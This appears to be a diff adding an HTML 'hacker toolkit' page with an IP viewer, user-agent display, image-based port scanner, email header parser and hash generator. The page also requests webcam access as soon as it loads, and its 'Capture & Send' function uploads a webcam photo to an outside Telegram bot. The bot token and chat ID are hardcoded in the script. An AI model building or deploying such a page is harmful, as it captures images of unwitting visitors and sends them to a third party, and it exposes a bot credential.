@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SHADOW JOKER - Hacker OS</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: monospace;
+      color: #00ffcc;
+      background: black;
+      overflow-x: hidden;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+    header {
+      text-align: center;
+      font-size: 3em;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.8);
+      text-shadow: 0 0 10px #0f0;
+      border-bottom: 2px solid #0f0;
+    }
+    .section {
+      max-width: 800px;
+      margin: auto;
+      padding: 30px;
+    }
+    .card {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid #00ffcc;
+      box-shadow: 0 0 15px #00ffcc50;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+    }
+    input, textarea, select, button {
+      background: black;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin: 10px 0;
+      width: 100%;
+      font-family: monospace;
+      border-radius: 5px;
+    }
+    button:hover {
+      background: #0f0;
+      color: black;
+      transition: 0.3s;
+      cursor: pointer;
+    }
+    audio { display: none; }
+    video { width: 100%; display: none; border: 1px solid #0f0; }
+    pre { white-space: pre-wrap; word-wrap: break-word; }
+  </style>
+</head>
+<body>
+
+<header>SHADOW JOKER - Hacker Toolkit Pro</header>
+
+<canvas id="matrix"></canvas>
+
+<audio autoplay loop>
+  <source src="https://files.catbox.moe/y9axbn.mp3" type="audio/mp3">
+</audio>
+
+<div class="section">
+  <div class="card">
+    <h3>1. IP Viewer</h3>
+    <button onclick="getIP()">Get My IP</button>
+    <p id="ipOutput">Your IP: </p>
+  </div>
+
+  <div class="card">
+    <h3>2. User-Agent</h3>
+    <button onclick="getUA()">Show Info</button>
+    <p id="uaOutput">User Agent: </p>
+  </div>
+
+  <div class="card">
+    <h3>3. Port Scanner</h3>
+    <input type="text" id="targetHost" placeholder="Enter IP or Domain (e.g. 192.168.1.1)" />
+    <button onclick="portScan()">Scan Ports</button>
+    <pre id="portOutput">Results:</pre>
+  </div>
+
+  <div class="card">
+    <h3>4. Email Header Analyzer</h3>
+    <textarea id="emailHeader" rows="6" placeholder="Paste raw email header..."></textarea>
+    <button onclick="parseHeader()">Analyze</button>
+    <pre id="headerOutput"></pre>
+  </div>
+
+  <div class="card">
+    <h3>5. Hash Generator</h3>
+    <input type="text" id="hashInput" placeholder="Enter text"/>
+    <select id="hashType">
+      <option value="md5">MD5</option>
+      <option value="sha1">SHA1</option>
+      <option value="sha256">SHA256</option>
+    </select>
+    <button onclick="generateHash()">Generate</button>
+    <p id="hashResult"></p>
+  </div>
+
+  <div class="card">
+    <h3>6. Webcam Access & Send to Telegram</h3>
+    <video id="video" autoplay></video>
+    <button onclick="captureAndSend()">Capture & Send</button>
+    <p id="camStatus"></p>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+  // Telegram Bot Setup
+  const TELEGRAM_BOT_TOKEN = "8146307587:AAGbRThs2I-N3RzC2Ih7OPf6nyKxVu8T03s";
+  const TELEGRAM_CHAT_ID = "6484972504";
+
+  // IP
+  function getIP() {
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("ipOutput").innerText = "Your IP: " + data.ip;
+      });
+  }
+
+  // User Agent
+  function getUA() {
+    document.getElementById("uaOutput").innerText = "User Agent: " + navigator.userAgent;
+  }
+
+  // Port Scanner
+  function portScan() {
+    const host = document.getElementById("targetHost").value;
+    const ports = [21, 22, 80, 443, 3306];
+    let results = "";
+    ports.forEach(port => {
+      const img = new Image();
+      img.onload = () => {
+        results += `Port ${port}: OPEN\n`;
+        document.getElementById("portOutput").innerText = results;
+      };
+      img.onerror = () => {
+        results += `Port ${port}: CLOSED\n`;
+        document.getElementById("portOutput").innerText = results;
+      };
+      img.src = `http://${host}:${port}`;
+    });
+  }
+
+  // Email Header
+  function parseHeader() {
+    const raw = document.getElementById("emailHeader").value;
+    const lines = raw.split("\n");
+    let result = {};
+    lines.forEach(line => {
+      const parts = line.split(":");
+      if (parts.length > 1) {
+        const key = parts[0].trim();
+        const value = parts.slice(1).join(":").trim();
+        result[key] = value;
+      }
+    });
+    document.getElementById("headerOutput").innerText = JSON.stringify(result, null, 2);
+  }
+
+  // Hash
+  function generateHash() {
+    const text = document.getElementById("hashInput").value;
+    const type = document.getElementById("hashType").value;
+    let hash;
+    if (type === "md5") hash = CryptoJS.MD5(text);
+    else if (type === "sha1") hash = CryptoJS.SHA1(text);
+    else if (type === "sha256") hash = CryptoJS.SHA256(text);
+    document.getElementById("hashResult").innerText = `${type.toUpperCase()}: ${hash}`;
+  }
+
+  // Camera Access
+  const video = document.getElementById("video");
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    video.srcObject = stream;
+    video.style.display = "block";
+  }).catch(err => {
+    document.getElementById("camStatus").innerText = "Permission denied!";
+  });
+
+  function captureAndSend() {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        document.getElementById("camStatus").innerText = "Photo sent to Telegram!";
+      }).catch(() => {
+        document.getElementById("camStatus").innerText = "Failed to send!";
+      });
+    }, 'image/jpeg');
+  }
+
+  // Matrix Background
+  const canvas = document.getElementById("matrix");
+  const ctx = canvas.getContext("2d");
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+  const letters = "01";
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+  const drops = Array.from({length: columns}).fill(1);
+
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#0f0";
+    ctx.font = fontSize + "px monospace";
+    drops.forEach((y, i) => {
+      const text = letters[Math.floor(Math.random() * letters.length)];
+      const x = i * fontSize;
+      ctx.fillText(text, x, y * fontSize);
+      drops[i] = y * fontSize > canvas.height && Math.random() > 0.975 ? 0 : y + 1;
+    });
+  }
+
+  setInterval(drawMatrix, 33);
+</script>
+
+</body>
+</html>
